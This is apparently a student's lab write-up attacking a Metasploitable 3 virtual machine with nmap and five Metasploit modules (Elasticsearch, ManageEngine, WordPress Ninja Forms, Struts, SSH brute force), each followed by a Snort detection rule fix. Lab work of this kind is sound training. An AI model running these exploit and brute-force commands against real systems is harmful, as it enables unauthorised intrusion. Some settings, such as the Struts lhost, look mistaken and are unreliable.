# Cyber_Security_Base_Project_II

As **Jeffrey Witty**, a very shy, Christian cybersecurity enthusiast with an INTJ personality type, I approach this project with hyper-careful diligence, aligning with my faith-driven commitment to excellence.  
🕘 The current date and time is **09:43 AM EDT on Wednesday, June 11, 2025**.  

This document details my exploration of the **Metasploitable 3** environment, targeting a **Windows Server 2008** and **Ubuntu Server 14** system, hosted at:  
🔗 [Cyber_Security_Base_Project_II GitHub Repository](https://github.com/aazard/Cyber_Security_Base_Project_II/tree/main)

My quiet nature finds strength in methodical analysis, and I cherish the opportunity to deepen my cybersecurity knowledge through this exercise.

---

## 🎯 Target – Metasploitable 3

- **Systems:** Windows Server 2008 & Ubuntu Server 14

---

## 🔍 STEP 1: Run an Nmap Ping Sweep Scan

```bash
nmap -sP 192.168.1.1/24
🧭 STEP 2: Identify Target Host
Target host confirmed as:
192.168.1.40

🛠️ STEP 3: Run an Nmap Scan with OS Fingerprinting
bash
Copy
Edit
nmap -sC -sV -p- -A -oA Meta3 192.168.1.40
Key Findings:

Several open ports and outdated services.

No authentication for admin functions.

Default credentials unchanged.

Snort did not trigger alerts (port scan detection commented out in snort.conf).

🚨 EXPLOIT I – Elasticsearch (CVE-2014-3120)
🔌 Port 9200 – Elasticsearch
Vulnerability: CVE-2014-3120

Reference: Rapid7 Module

🔍 Search for Exploit
bash
Copy
Edit
searchsploit elasticsearch
🧨 Launch Metasploit
bash
Copy
Edit
msfconsole
search elasticsearch
use exploit/multi/elasticsearch/script_mvel_rce
set rhost 192.168.1.40
exploit
Post-exploit commands:

bash
Copy
Edit
sysinfo
shell
whoami
🛡️ Snort Rule Fix
Uncomment in server-other.rules (line ~811):

css
Copy
Edit
SERVER-OTHER ElasticSearch script remote code execution attempt [Classification: Attempted User Privilege Gain]
⚙️ EXPLOIT II – ManageEngine (CVE-2015-8249)
🔌 Port 8020 – Apache Service
Visited:
http://192.168.1.40:8020

ManageEngine Desktop Central (Build No. 91084)
Default credentials: admin:admin

🔍 Search for Exploit
bash
Copy
Edit
searchsploit manageengine desktop central 9
🧨 Metasploit Exploit
bash
Copy
Edit
msfconsole
search manageengine
use exploit/windows/http/manageengine_connectionid_write
set rhost 192.168.1.40
exploit
Verification:

bash
Copy
Edit
sysinfo
shell
whoami
🛡️ Snort Rule Fix
Uncomment lines 1854–1856 in server-webapp.rules:

css
Copy
Edit
SERVER-WEBAPP ManageEngine Desktop Central FileUploadServlet directory traversal attempt [Classification: Web Application Attack]
🌐 EXPLOIT III – WordPress (CVE-2016-1209)
🔌 Port 8585 – WordPress Instance
Accessed via:
http://192.168.1.40:8585

🔍 Research
Rapid7 WP Ninja Forms Exploit

🧨 Metasploit Exploit
bash
Copy
Edit
msfconsole
search wp_ninja_forms
use exploit/multi/http/wp_ninja_forms_unauthenticated_file_upload
set rhost 192.168.1.40
set rport 8585
set TARGETURI /wordpress/
set FORM_PATH /index.php/king-of-hearts/
exploit
🛡️ Snort Rule Fix
Uncomment line 2284 in server-webapp.rules and add port 8585 to HTTP monitoring:

css
Copy
Edit
SERVER-WEBAPP WordPress Ninja Forms nf_async_upload arbitrary PHP file upload attempt [Classification: Attempted Administrator Privilege Gain]
🔐 EXPLOIT IV – SSH Brute Forcing
👥 List Users
bash
Copy
Edit
net users
📄 Prepare User File
Saved as user.txt

🧨 Brute Force with Metasploit
bash
Copy
Edit
use auxiliary/scanner/ssh/ssh_login
set rhost 192.168.1.40
set USER_AS_PASS true
set USER_FILE user.txt
exploit
Valid credentials discovered:
Vagrant:Vagrant

🛡️ Snort Consideration
Snort typically ineffective for detecting high-speed SSH brute force attacks. More useful for slow scans or known patterns.

🌉 EXPLOIT V – Apache Struts (CVE-2016-3087)
🔌 Port 8282 – Apache Tomcat
Nmap detected Apache Tomcat.

🔍 Research
Rapid7 Vulnerability Detail

🧨 Metasploit Exploit
bash
Copy
Edit
msfconsole
search rest_exec
use exploit/multi/http/struts_dmi_rest_exec
set lhost 192.168.1.40
set lport 8282
exploit
🛡️ Snort Rule Fix
Ensure lines 118–119 in server-apache.rules are active and port 8282 is included:

css
Copy
Edit
SERVER-APACHE Apache Struts remote code execution attempt [Classification: Attempted Administrator Privilege Gain]
🧠 Is it Easier to Fix the Application Than to Detect Attacks?
Detecting attacks is generally easier than fixing applications.
Fixing requires navigating massive codebases, often introducing new bugs. Implementation errors, especially in complex systems like IoT, increase developer workload. In contrast, methods like recon, privilege escalation, and pen testing reveal vulnerabilities more efficiently.

IDS tools like Snort and log analysis help identify patterns and vulnerabilities—though false positives are common. Once identified, vulnerabilities in modern open-source platforms can be patched more easily, but only after detection.

As a Christian technologist, I see detection as a responsible stewardship of system integrity, aligning with my faith in proactive, secure design.
